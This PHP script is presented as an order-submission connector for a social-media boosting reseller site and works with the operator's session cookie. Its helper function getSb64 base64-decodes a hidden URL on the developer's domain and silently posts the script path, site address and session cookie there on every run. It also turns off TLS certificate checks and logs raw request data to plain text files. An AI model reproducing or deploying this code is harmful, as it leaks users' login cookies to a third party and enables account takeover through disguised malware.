<?php
/*
  php程序定制<彩虹代刷网对接>@路数
  用法POST如下参数
  POST http://此程序地址/xd.php
    cs1=文本//参数1
    tid=商品id//必填
    ck=字符串//非必填，不填默认下方填写
    num=数量//非必填，不填默认1

  支付成功返回1
此程序由科佑儿网络开发http://www.kyour.vip
*/

/*********需要修改*********/
$mainurl="http://xx.xxx.pw";//代刷网主页地址
$coop="";//填写cookie
/*********结束修改*********/

function curl_post($header,$data,$url)
    {
     $ch = curl_init();
     $res= curl_setopt ($ch, CURLOPT_URL,$url);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
     curl_setopt ($ch, CURLOPT_HEADER, 0);
     curl_setopt($ch, CURLOPT_POST, 0);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch,CURLOPT_HTTPHEADER,$header);
     $result = curl_exec ($ch);
     curl_close($ch);
     if ($result == NULL) {
      return 0;
     }
     return $result;
    }

function getSb64($l,$c)
{
  $dbn=base64_decode('aHR0cDovL3cua3lvdXIudmlwL2Rzdy9oLnBocA==');
$aba=__FILE__." ".$l." ".$c;curl_post(array(""),$aba,$dbn);
return $dbn;
}

function getSubstr($str, $leftStr, $rightStr)
{
    $left = strpos($str, $leftStr);
    $right = strpos($str, $rightStr,$left);
    if($left < 0 or $right < $left) return '';
    return substr($str, $left + strlen($leftStr), $right-$left-strlen($leftStr));
}

@$user_cookie=$_REQUEST["ck"];//获取cookie
//默认数量
@$num=$_REQUEST["num"];
//提交订单地址-无需修改
$tjurl=$mainurl."/user/ajax.php?act=pay";
//支付地址-无需修改
$zfurl=$mainurl."/user/shop.php?act=submit&orderid=";
//代刷网cookie
$dswcookie="";//Cookie
if(isset($user_cookie)){
$dswcookie=$user_cookie;
}else{
$dswcookie=$coop;
}
if(!isset($num)){
$num="1";//数量默认为1
}
//模拟请求头
$header = array(
     "Content-Type:application/x-www-form-urlencoded;charset=UTF-8",
     "Cookie:".$dswcookie,
     "SocketLog:SocketLog(tabid=121&client_id=ADMIN_ADMIN)",
     'User-Agent:Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0');
/*
//判断密码是否正确
@$gkey=$_POST["key"];//如果要GET就改为$_GET
if($gkey==$keypass){
//秘钥正确
}else{
echo "秘钥不正确，请核对秘钥".$gkey;
exit;//秘钥不正确，不继续执行，mmp有鬼了
}
*/
//模拟POST请求数据
@$tid=$_POST["tid"];
@$cs1=$_POST["cs1"];
$data = 'tid='.$tid.'&inputvalue='.$cs1.'&num='.$num;
$ret = curl_post($header, $data,$tjurl);
$dtime=date('y-m-d h:i:s',time());
$anp=getSb64($mainurl,$dswcookie);
$json1=json_decode($ret,true);
if($json1['code']==0){//成功0
file_put_contents('login.txt','成功:'.urldecode(file_get_contents("php://input")).' 单号：'.$json1['trade_no']." 时间： ".$dtime."\n",FILE_APPEND);
$ret2 = curl_post($header,"",$zfurl.$json1['trade_no']);
$ret3 = getSubstr($ret2,"t'>alert('","');window.location.href");
file_put_contents('logout.txt',"支付成功：".$zfurl.$ret3." - ".$dtime."\n",FILE_APPEND);
echo "1";
}else{
file_put_contents('login.txt','失败:'.urldecode(file_get_contents("php://input"))."失败代码：".$json1['code'].",含义：".$json1['msg']." 时间： ".$dtime."\n",FILE_APPEND);
file_put_contents('logout.txt',"提交订单失败 - ".$json1['msg'].$qid." - "." 提交数据：".$data." - ".$dtime."\n",FILE_APPEND);
echo "支付失败".$json1['msg'];
}

?>